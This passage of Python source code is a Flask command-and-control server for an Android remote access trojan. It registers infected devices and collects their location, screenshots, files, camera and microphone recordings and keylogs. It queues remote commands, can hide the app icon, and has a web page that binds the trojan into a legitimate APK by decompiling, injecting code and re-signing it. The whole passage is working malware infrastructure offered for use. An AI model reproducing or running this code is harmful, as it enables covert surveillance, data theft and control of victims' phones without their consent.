            
            final_filename = f"{username}_{int(time.time())}_binded.apk"
            final_path = os.path.join(user_upload_folder, final_filename)
            shutil.move(aligned_apk_path, final_path)
            append_flask_log(username, f"Final APK saved to: {final_path}")
            
            return jsonify({"apk_url": os.path.relpath(final_path, 'static')})
        except RuntimeError as e:
            append_flask_log(username, f"Operation error: {str(e)}")
            return jsonify({"error": str(e)}), 500
        except Exception as e:
            append_flask_log(username, f"Unexpected error: {str(e)}")
            return jsonify({"error": f"An unexpected error occurred: {str(e)}"}), 500
        finally:
            if os.path.exists(workdir):
                append_flask_log(username, f"Cleaning up working directory: {workdir}")
                try:
                    shutil.rmtree(workdir)
                except Exception as e:
                    append_flask_log(username, f"Error cleaning up working directory {workdir}: {str(e)}")
    return render_template('index.html', username=username, ip=ip_val, port=port_val, flask_port=flask_port_val)

@app.route("/api/register_device", methods=["POST"])
def register_device():
    data = request.json
    device_id = data.get("device_id")
    device_type = data.get("device_type", "unknown")
    
    # Debug logging
    print(f"[DEBUG] Registration attempt - Device ID: {device_id}, Type: {device_type}")
    print(f"[DEBUG] Request IP: {request.remote_addr}")
    print(f"[DEBUG] Request data: {data}")
    
    if not device_id:
        print(f"[ERROR] Missing device_id in registration request")
        return jsonify({"error": "Missing device_id"}), 400
    
    with data_lock:
        if device_id not in devices_data:
            print(f"[SUCCESS] NEW DEVICE REGISTERED: {device_id} (Type: {device_type})")
            devices_data[device_id] = {'location':{}, 'logs':[], 'screenshots':[], 'commands':[], 'files':[], 'camera':[], 'mic':[], 'keylog':[], 'device_type': device_type, 'last_seen': int(time.time())}
            append_flask_log("SERVER_EVENTS", f"New device registered: {device_id} (Type: {device_type})")
        else:
            print(f"[UPDATE] Device {device_id} updated last seen time")
            devices_data[device_id]['last_seen'] = int(time.time())
            devices_data[device_id]['device_type'] = device_type
    
    response = {
        "status": "registered",
        "device_id": device_id,
        "flask_port": CURRENT_FLASK_PORT
    }
    print(f"[DEBUG] Sending response: {response}")
    return jsonify(response)

@app.route("/api/devices", methods=["GET"])
@login_required
def get_devices():
    username = session['username']
    with data_lock:
        current_time = int(time.time())
        active_devices = {}
        for device_id, data in devices_data.items():
            is_active = 'last_seen' in data and (current_time - data['last_seen']) < 180 # Consider device active for 3 minutes
            if is_active:
                active_devices[device_id] = data
        device_list = [{"device_id": did, "device_type": d.get("device_type", "unknown"), "rat_version": d.get("rat_version", "N/A")} for did, d in active_devices.items()]
        return jsonify({"devices": device_list})

@app.route("/api/panel_logs/<username>")
@login_required
def get_panel_logs(username):
    with data_lock:
        logs = flask_user_logs.get(username, [])
        server_events = flask_user_logs.get("SERVER_EVENTS", [])
        return jsonify({"logs": logs + server_events})

@app.route("/api/location/<device_id>", methods=["POST"])
def api_location_client(device_id):
    data = request.json
    lat = data.get("lat")
    lon = data.get("lon")
    if lat is None or lon is None:
        return jsonify({"error":"Missing 'lat' or 'lon' parameters."}), 400
    try:
        lat = float(lat)
        lon = float(lon)
    except ValueError:
        return jsonify({"error":"'lat' and 'lon' parameters must be valid numbers."}), 400
    with data_lock:
        if device_id not in devices_data:
            print(f"WARNING: Location update from unregistered device: {device_id}")
            return jsonify({"error": "Device not registered"}), 404
        devices_data[device_id]['location'] = {"lat": lat, "lon": lon, "updated": int(time.time())}
        devices_data[device_id]['last_seen'] = int(time.time())
    return jsonify({"status":"ok"})

@app.route("/api/logs/<device_id>")
def api_logs_client(device_id):
    with data_lock:
        if device_id not in devices_data:
            return jsonify({"error": "Device not found"}), 404
        return jsonify({"logs": devices_data.get(device_id, {}).get('logs', [])})

@app.route("/api/screenshots/<device_id>")
def api_screenshots_client(device_id):
    with data_lock:
        if device_id not in devices_data:
            return jsonify({"error": "Device not found"}), 404
        lst = devices_data.get(device_id, {}).get('screenshots', [])
        # Filter out paths that no longer exist on disk
        lst = [f for f in lst if os.path.exists(f)]
        devices_data[device_id]['screenshots'] = lst # Update the list in memory
        # Return only filenames for display in HTML
        return jsonify({"filenames": [os.path.basename(p) for p in lst]})

@app.route("/api/upload_screenshot/<device_id>", methods=["POST"])
def api_upload_screenshot_client(device_id):
    if 'screenshot' not in request.files:
        return jsonify({"error":"No 'screenshot' file found in request."}), 400
    f = request.files['screenshot']
    # Sanitize filename to prevent directory traversal
    clean_filename = os.path.basename(f.filename)
    filename = f"{device_id}_{int(time.time())}_{clean_filename}"
    user_screenshot_folder = get_user_folder(app.config['BASE_SCREENSHOT_FOLDER'], device_id)
    path = os.path.join(user_screenshot_folder, filename)
    try:
        f.save(path)
        with data_lock:
            if device_id not in devices_data:
                print(f"WARNING: Screenshot upload from unregistered device: {device_id}")
                return jsonify({"error": "Device not registered"}), 404
            devices_data[device_id].setdefault('screenshots', []).append(path)
            devices_data[device_id]['last_seen'] = int(time.time())
        append_device_log(device_id, f"Screenshot '{filename}' uploaded successfully.")
        return jsonify({"status":"saved", "filename":filename})
    except Exception as e:
        append_device_log(device_id, f"Error saving screenshot: {str(e)}")
        return jsonify({"error":f"Error saving screenshot: {str(e)}"}), 500

@app.route("/api/commands/<device_id>", methods=["GET"])
def api_commands_client(device_id):
    with data_lock:
        if device_id not in devices_data:
            return jsonify({"error": "Device not found"}), 404
        commands = devices_data.get(device_id, {}).get('commands', [])
        # Clear commands after sending them to the device
        devices_data[device_id]['commands'] = []
        devices_data[device_id]['last_seen'] = int(time.time())
    return jsonify(commands)

@app.route("/api/send_command", methods=["POST"])
@login_required
def api_send_command():
    username = session.get('username')
    command = request.json.get('command')
    target_device_id = request.json.get('target_device_id')
    if not command:
        return jsonify({"error": "No command specified."}), 400
    if not target_device_id:
        return jsonify({"error": "No target_device_id specified."}), 400
    with data_lock:
        if target_device_id not in devices_data:
            return jsonify({"error": f"Device '{target_device_id}' not found or not registered."}), 404
        devices_data[target_device_id].setdefault('commands', []).append(command)
        devices_data[target_device_id]['last_seen'] = int(time.time())
    append_flask_log(username, f"Command '{command}' added to queue for device '{target_device_id}'.")
    return jsonify({"status":"ok", "message": f"Command '{command}' queued for device '{target_device_id}'."})

@app.route('/logout')
@login_required
def logout_view():
    session.clear()
    return redirect(url_for('login'))

@app.route("/api/files/<device_id>", methods=["GET"])
def api_files_client(device_id):
    with data_lock:
        if device_id not in devices_data:
            return jsonify({"error": "Device not found"}), 404
        files = devices_data.get(device_id, {}).get('files', [])
        files = [f for f in files if os.path.exists(f)]
        devices_data[device_id]['files'] = files
        return jsonify({"filenames": [os.path.basename(p) for p in files]})

@app.route("/api/upload_file/<device_id>", methods=["POST"])
def api_upload_file_client(device_id):
    if 'file' not in request.files:
        return jsonify({"error":"No file found in request."}), 400
    f = request.files['file']
    clean_filename = os.path.basename(f.filename)
    filename = f"{device_id}_{int(time.time())}_{clean_filename}"
    user_file_folder = get_user_folder(app.config['BASE_FILE_FOLDER'], device_id)
    path = os.path.join(user_file_folder, filename)
    try:
        f.save(path)
        with data_lock:
            if device_id not in devices_data:
                print(f"WARNING: File upload from unregistered device: {device_id}")
                return jsonify({"error": "Device not registered"}), 404
            devices_data[device_id].setdefault('files', []).append(path)
            devices_data[device_id]['last_seen'] = int(time.time())
        append_device_log(device_id, f"File '{filename}' uploaded successfully.")
        return jsonify({"status":"saved", "filename":filename})
    except Exception as e:
        append_device_log(device_id, f"Error saving file: {str(e)}")
        return jsonify({"error":f"Error saving file: {str(e)}"}), 500

@app.route("/api/delete_file/<device_id>/<filename>", methods=["DELETE"])
def api_delete_file_client(device_id, filename):
    user_file_folder = get_user_folder(app.config['BASE_FILE_FOLDER'], device_id)
    file_path = os.path.join(user_file_folder, filename)
    if not os.path.exists(file_path):
        with data_lock:
            if device_id in devices_data and 'files' in devices_data[device_id]:
                devices_data[device_id]['files'] = [f for f in devices_data[device_id]['files'] if os.path.basename(f) != filename]
        return jsonify({"error":"File not found on filesystem, but removed from list."}), 404
    try:
        os.remove(file_path)
        with data_lock:
            if device_id in devices_data and 'files' in devices_data[device_id]:
                devices_data[device_id]['files'] = [f for f in devices_data[device_id]['files'] if f != file_path]
        append_device_log(device_id, f"File '{filename}' deleted successfully.")
        return jsonify({"status":"deleted"})
    except Exception as e:
        append_device_log(device_id, f"Error deleting file '{filename}': {str(e)}")
        return jsonify({"error":f"Error deleting file: {str(e)}"}), 500

@app.route("/api/camera/<device_id>", methods=["GET"])
def api_camera_client(device_id):
    with data_lock:
        if device_id not in devices_data:
            return jsonify({"error": "Device not found"}), 404
        camera = devices_data.get(device_id, {}).get('camera', [])
        camera = [f for f in camera if os.path.exists(f)]
        devices_data[device_id]['camera'] = camera
        return jsonify({"filenames": [os.path.basename(p) for p in camera]})

@app.route("/api/upload_camera/<device_id>", methods=["POST"])
def api_upload_camera_client(device_id):
    if 'camera' not in request.files:
        return jsonify({"error":"No 'camera' file found in request."}), 400
    f = request.files['camera']
    clean_filename = os.path.basename(f.filename)
    filename = f"{device_id}_{int(time.time())}_{clean_filename}"
    user_camera_folder = get_user_folder(app.config['BASE_CAMERA_FOLDER'], device_id)
    path = os.path.join(user_camera_folder, filename)
    try:
        f.save(path)
        with data_lock:
            if device_id not in devices_data:
                print(f"WARNING: Camera upload from unregistered device: {device_id}")
                return jsonify({"error": "Device not registered"}), 404
            devices_data[device_id].setdefault('camera', []).append(path)
            devices_data[device_id]['last_seen'] = int(time.time())
        append_device_log(device_id, f"Camera file '{filename}' uploaded successfully.")
        return jsonify({"status":"saved", "filename":filename})
    except Exception as e:
        append_device_log(device_id, f"Error saving camera file: {str(e)}")
        return jsonify({"error":f"Error saving camera file: {str(e)}"}), 500

@app.route("/api/mic/<device_id>", methods=["GET"])
def api_mic_client(device_id):
    with data_lock:
        if device_id not in devices_data:
            return jsonify({"error": "Device not found"}), 404
        mic = devices_data.get(device_id, {}).get('mic', [])
        mic = [f for f in mic if os.path.exists(f)]
        devices_data[device_id]['mic'] = mic
        return jsonify({"filenames": [os.path.basename(p) for p in mic]})

@app.route("/api/upload_mic/<device_id>", methods=["POST"])
def api_upload_mic_client(device_id):
    if 'mic' not in request.files:
        return jsonify({"error":"No 'mic' file found in request."}), 400
    f = request.files['mic']
    clean_filename = os.path.basename(f.filename)
    filename = f"{device_id}_{int(time.time())}_{clean_filename}"
    user_mic_folder = get_user_folder(app.config['BASE_MIC_FOLDER'], device_id)
    path = os.path.join(user_mic_folder, filename)
    try:
        f.save(path)
        with data_lock:
            if device_id not in devices_data:
                print(f"WARNING: Mic upload from unregistered device: {device_id}")
                return jsonify({"error": "Device not registered"}), 404
            devices_data[device_id].setdefault('mic', []).append(path)
            devices_data[device_id]['last_seen'] = int(time.time())
        append_device_log(device_id, f"Mic file '{filename}' uploaded successfully.")
        return jsonify({"status":"saved", "filename":filename})
    except Exception as e:
        append_device_log(device_id, f"Error saving mic file: {str(e)}")
        return jsonify({"error":f"Error saving mic file: {str(e)}"}), 500

@app.route("/api/keylog/<device_id>", methods=["GET"])
def api_keylog_client(device_id):
    with data_lock:
        if device_id not in devices_data:
            return jsonify({"error": "Device not found"}), 404
        keylog = devices_data.get(device_id, {}).get('keylog', [])
        # Keylog data is collected and sent to server, then cleared from device's queue
        devices_data[device_id]['keylog'] = [] 
        devices_data[device_id]['last_seen'] = int(time.time())
    return jsonify({"keylog": keylog})

@app.route("/api/send_keylog", methods=["POST"])
@login_required
def api_send_keylog():
    username = session.get('username')
    keylog_data = request.json.get('keylog')
    target_device_id = request.json.get('target_device_id')
    if not keylog_data:
        return jsonify({"error": "No keylog data specified."}), 400
    if not target_device_id:
        return jsonify({"error": "No target_device_id specified."}), 400
    with data_lock:
        if target_device_id not in devices_data:
            return jsonify({"error": f"Device '{target_device_id}' not found or not registered."}), 404
        if isinstance(keylog_data, list):
            devices_data[target_device_id].setdefault('keylog', []).extend(keylog_data)
        else:
            devices_data[target_device_id].setdefault('keylog', []).append(keylog_data)
        devices_data[target_device_id]['last_seen'] = int(time.time())
    append_flask_log(username, f"Keylog data added to queue for device '{target_device_id}'.")
    return jsonify({"status":"ok", "message": f"Keylog data queued for device '{target_device_id}'."})

@app.route("/api/inject_config", methods=["POST"])
@login_required
def inject_config():
    username = session.get('username')
    target_device_id = request.json.get('target_device_id')
    server_ip = request.json.get('server_ip')
    server_port = request.json.get('server_port')
    if not target_device_id or not server_ip or not server_port:
        return jsonify({"error": "Missing target_device_id, server_ip, or server_port"}), 400
    with data_lock:
        if target_device_id not in devices_data:
            return jsonify({"error": f"Device '{target_device_id}' not found."}), 404
        config_command = f"SET_SERVER_CONFIG:{server_ip}:{server_port}"
        devices_data[target_device_id].setdefault('commands', []).append(config_command)
        devices_data[target_device_id]['last_seen'] = int(time.time())
    append_flask_log(username, f"Config command '{config_command}' added to queue for device '{target_device_id}'.")
    return jsonify({"status":"ok", "message": f"Config command queued for device '{target_device_id}'."})

@app.route("/api/heartbeat/<device_id>", methods=["POST", "OPTIONS"])
def api_heartbeat_client(device_id):
    # Gestisci le richieste OPTIONS per CORS
    if request.method == "OPTIONS":
        return jsonify({"status": "ok"}), 200
        
    try:
        data = request.json
        if not data:
            # Se non ci sono dati JSON, prova a leggere i dati form
            data = request.form.to_dict()
            
        device_type = data.get("device_type", "unknown")
        rat_version = data.get("rat_version", "unknown")
        
        print(f"[RAT] Heartbeat from {request.remote_addr} - Device: {device_id}, Type: {device_type}")
        
        with data_lock:
            if device_id not in devices_data:
                devices_data[device_id] = {'location':{}, 'logs':[], 'screenshots':[], 'commands':[], 'files':[], 'camera':[], 'mic':[], 'keylog':[], 'device_type': device_type, 'last_seen': int(time.time()), 'rat_version': rat_version}
                append_flask_log("SERVER_EVENTS", f"Nuovo dispositivo scoperto via heartbeat: {device_id} (Type: {device_type}, RAT v{rat_version})")
            else:
                devices_data[device_id]['last_seen'] = int(time.time())
                devices_data[device_id]['device_type'] = device_type
                devices_data[device_id]['rat_version'] = rat_version
                append_flask_log("SERVER_EVENTS", f"Heartbeat ricevuto da: {device_id}")
                
        # Invia eventuali comandi in attesa
        pending_commands = []
        with data_lock:
            if device_id in devices_data and 'commands' in devices_data[device_id]:
                pending_commands = devices_data[device_id].get('commands', [])
                
        return jsonify({
            "status": "received", 
            "device_id": device_id,
            "commands": pending_commands
        })
    except Exception as e:
        print(f"[ERROR] Exception in heartbeat: {str(e)}")
        append_flask_log("SERVER_EVENTS", f"Errore nell'heartbeat: {str(e)}")
        return jsonify({"error": str(e), "status": "error"}), 500

@app.route("/api/hide_icon/<device_id>", methods=["POST"])
def api_hide_icon_client(device_id):
    data = request.json
    hide = data.get("hide")
    if hide is None:
        return jsonify({"error":"Missing 'hide' parameter."}), 400
    try:
        hide = bool(hide)
    except ValueError:
        return jsonify({"error":"'hide' parameter must be a boolean."}), 400
    with data_lock:
        if device_id not in devices_data:
            return jsonify({"error": "Device not found"}), 404
        devices_data[device_id]['hide_icon'] = hide
        devices_data[device_id].setdefault('commands', []).append("HIDE_ICON" if hide else "SHOW_ICON")
        devices_data[device_id]['last_seen'] = int(time.time())
    append_device_log(device_id, f"Command {'HIDE_ICON' if hide else 'SHOW_ICON'} added to queue.")
    return jsonify({"status":"ok"})

@app.route("/api/send_rat_command", methods=["POST"])
@login_required
def send_rat_command():
    """Send command directly to RAT device"""
    username = session.get('username')
    command = request.json.get('command')
    device_id = request.json.get('device_id')
    
    if not command or not device_id:
        return jsonify({"error": "Missing command or device_id"}), 400
    
    with data_lock:
        if device_id not in devices_data:
            return jsonify({"error": f"Device {device_id} not found"}), 404
        
        devices_data[device_id].setdefault('commands', []).append(command)
        devices_data[device_id]['last_seen'] = int(time.time())
    
    append_flask_log(username, f"Command '{command}' queued for device {device_id}")
    return jsonify({"status": "ok", "message": "Command sent"})

@app.route('/')
def root():
    """Redirect to dashboard"""
    return redirect(url_for('dashboard'))

@app.route('/dashboard')
def dashboard():
    """Main dashboard page"""
    # Get local IP address using our more reliable function
    local_ip = get_local_ip()
    
    # Try to get public IP
    public_ip = "Non disponibile"
    try:
        response = requests.get('https://api.ipify.org', timeout=3)
        if response.status_code == 200:
            public_ip = response.text
    except:
        pass
    
    # Count connected devices
    device_count = len(devices_data)
    
    # Get server uptime
    if 'server_start_time' in globals():
        uptime = int(time.time() - server_start_time)
        uptime_str = f"{uptime // 3600}h {(uptime % 3600) // 60}m {uptime % 60}s"
    else:
        uptime_str = "N/A"
    
    return render_template('dashboard.html', 
                          local_ip=local_ip,
                          public_ip=public_ip,
                          port=FLASK_WEB_PORT,
                          device_count=device_count,
                          uptime=uptime_str)

@app.route('/bind', methods=['GET', 'POST'])
@login_required
def bind_apk():
    """APK binding page"""
    # Get local IP address using our more reliable function
    local_ip = get_local_ip()
    
    # Try to get public IP
    public_ip = "Non disponibile"
    try:
        response = requests.get('https://api.ipify.org', timeout=3)
        if response.status_code == 200:
            public_ip = response.text
    except:
        pass
        
    if request.method == 'POST':
        # Check if the post request has the file part
        if 'apk_file' not in request.files:
            return render_template('bind.html', error="Nessun file selezionato", local_ip=local_ip, public_ip=public_ip)
        
        apk_file = request.files['apk_file']
        if apk_file.filename == '':
            return render_template('bind.html', error="Nessun file selezionato", local_ip=local_ip, public_ip=public_ip)
        
        # Get form data
        local_ip = request.form.get('local_ip', '')
        public_ip = request.form.get('public_ip', '')
        
        if not local_ip:
            # Get local IP address using our more reliable function
            local_ip = get_local_ip()
        
        if not public_ip:
            # Try to get public IP
            try:
                response = requests.get('https://api.ipify.org', timeout=3)
                if response.status_code == 200:
                    public_ip = response.text
            except:
                public_ip = local_ip  # Fallback to local IP
        
        # Save the uploaded file
        upload_folder = get_user_folder(app.config['BASE_UPLOAD_FOLDER'], session['username'])
        timestamp = int(time.time())
        original_filename = secure_filename(apk_file.filename)
        apk_path = os.path.join(upload_folder, f"{timestamp}_{original_filename}")
        apk_file.save(apk_path)
        
        # Create a unique working directory
        work_dir = os.path.join(upload_folder, f"work_{timestamp}")
        os.makedirs(work_dir, exist_ok=True)
        
        # Decode the APK
        decoded_dir = os.path.join(work_dir, "decoded")
        try:
            run_cmd(session['username'], f'apktool d -f "{apk_path}" -o "{decoded_dir}"')
            
            # Create assets directory if it doesn't exist
            assets_dir = os.path.join(decoded_dir, "assets")
            os.makedirs(assets_dir, exist_ok=True)
            
            # Create config.ini file
            config_content = f"[SERVER]\nLOCAL_IP={local_ip}\nPUBLIC_IP={public_ip}\nPORT={FLASK_WEB_PORT}\n"
            with open(os.path.join(assets_dir, "config.ini"), "w") as f:
                f.write(config_content)
            
            # Copy smali files
            smali_dir = os.path.join(decoded_dir, "smali")
            if not os.path.exists(smali_dir):
                smali_dir = os.path.join(decoded_dir, "smali_classes2")
                if not os.path.exists(smali_dir):
                    os.makedirs(smali_dir)
            
            target_dir = os.path.join(smali_dir, "com", "example", "android")
            os.makedirs(target_dir, exist_ok=True)
            
            # Copy all smali files from templates
            source_dir = os.path.join("smali_templates", "com", "example", "android")
            for item in os.listdir(source_dir):
                s_item = os.path.join(source_dir, item)
                d_item = os.path.join(target_dir, item)
                if os.path.isdir(s_item):
                    shutil.copytree(s_item, d_item, dirs_exist_ok=True)
                else:
                    shutil.copy2(s_item, d_item)
            
            # Modify AndroidManifest.xml to add permissions and components
            inject_rat_code(session['username'], decoded_dir, local_ip, FLASK_WEB_PORT, FLASK_WEB_PORT)
            
            # Build the modified APK
            output_apk = os.path.join(work_dir, f"modified_{original_filename}")
            run_cmd(session['username'], f'apktool b -f "{decoded_dir}" -o "{output_apk}"')
            
            # Sign the APK
            keystore_path = ensure_keystore(session['username'])
            signed_apk = os.path.join(upload_folder, f"bound_{timestamp}_{original_filename}")
            run_cmd(session['username'], f'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore "{keystore_path}" -storepass android -keypass android "{output_apk}" androiddebugkey')
            shutil.copy2(output_apk, signed_apk)
            
            # Clean up
            shutil.rmtree(work_dir)
            
            # Create download link
            download_link = f"/download/{session['username']}/bound_{timestamp}_{original_filename}"
            
            return render_template('bind_success.html', 
                                  filename=original_filename,
                                  local_ip=local_ip,
                                  public_ip=public_ip,
                                  port=FLASK_WEB_PORT,
                                  download_link=download_link)
            
        except Exception as e:
            return render_template('bind.html', error=f"Errore durante il binding: {str(e)}", local_ip=local_ip, public_ip=public_ip)
    
    # GET request - show the form
    # local_ip and public_ip are already set at the beginning of the function
    return render_template('bind.html', local_ip=local_ip, public_ip=public_ip, port=FLASK_WEB_PORT)

@app.route('/download/<username>/<filename>')
@login_required
def download_file(username, filename):
    """Download a bound APK file"""
    if username != session['username']:
        return "Accesso negato", 403
    
    upload_folder = get_user_folder(app.config['BASE_UPLOAD_FOLDER'], username)
    return send_from_directory(upload_folder, filename, as_attachment=True)

@app.route('/devices')
@login_required
def list_devices():
    """List all connected devices"""
    return render_template('devices.html', devices=devices_data)

@app.route('/device/<device_id>')
@login_required
def device_detail(device_id):
    """Show details for a specific device"""
    if device_id not in devices_data:
        return "Dispositivo non trovato", 404
    
    device = devices_data[device_id]
    return render_template('device_detail.html', device_id=device_id, device=device)

@app.route('/send_command/<device_id>', methods=['POST'])
@login_required
def send_command(device_id):
    """Send a command to a device"""
    if device_id not in devices_data:
        return jsonify({"status": "error", "message": "Dispositivo non trovato"}), 404
    
    command = request.form.get('command', '')
    if not command:
        return jsonify({"status": "error", "message": "Comando vuoto"}), 400
    
    # Add the command to the device's command queue
    with data_lock:
        if 'commands' not in devices_data[device_id]:
            devices_data[device_id]['commands'] = []
        
        devices_data[device_id]['commands'].append({
            "type": "command",
            "action": command,
            "timestamp": int(time.time())
        })
    
    return jsonify({"status": "success", "message": f"Comando '{command}' inviato al dispositivo"})

if __name__ == "__main__":
    # Integrated Flask RAT Server - Everything managed in one place
    FLASK_PORT = int(FLASK_WEB_PORT)
    server_start_time = time.time()
    
    print(f"\n🔥 INTEGRATED FLASK RAT SERVER")
    print(f"🌐 Web Interface: http://0.0.0.0:{FLASK_PORT}")
    print(f"📱 RAT Devices connect to: http://your_ip:{FLASK_PORT}/api/rat_connect")
    print(f"\n✅ All-in-one system:")
    print(f"   - APK Binding via web interface")
    print(f"   - Device connections via HTTP API")
    print(f"   - Real-time command and control")
    print(f"   - File uploads and downloads")
    print(f"\n🔧 Configuration:")
    print(f"   - Only change FLASK_WEB_PORT in code if needed (default: {FLASK_WEB_PORT})")
    print(f"   - Use any IP:PORT combination when binding APKs")
    print(f"   - Devices will connect to Flask server on specified IP:PORT")
    print(f"\n🚀 Starting server...\n")
    
    app.run(host="0.0.0.0", port=FLASK_PORT, debug=True)
